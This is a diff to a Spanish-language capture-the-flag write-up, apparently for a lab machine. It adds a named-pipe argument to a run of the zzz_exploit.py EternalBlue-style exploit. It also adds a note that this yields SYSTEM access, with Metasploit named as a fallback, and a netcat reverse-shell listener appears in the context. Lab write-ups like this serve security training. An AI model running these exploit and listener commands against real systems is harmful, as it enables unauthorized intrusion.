@@ -72,5 +72,8 @@ rlwrap nc -nlvp 443
 
 Y ejecutaremos el script de nuevo
 ```Shell
-python2 zzz_exploit.py 10.129.227.181
+python2 zzz_exploit.py 10.129.227.181 browser
 ```
+
+Obteneindo acceso como *NTATHORITY SYSTEM* a la maquina victima, pudiendo obtener todas las flags.
+En caso de no funcionar se puede usar [[METASPLOIT]]
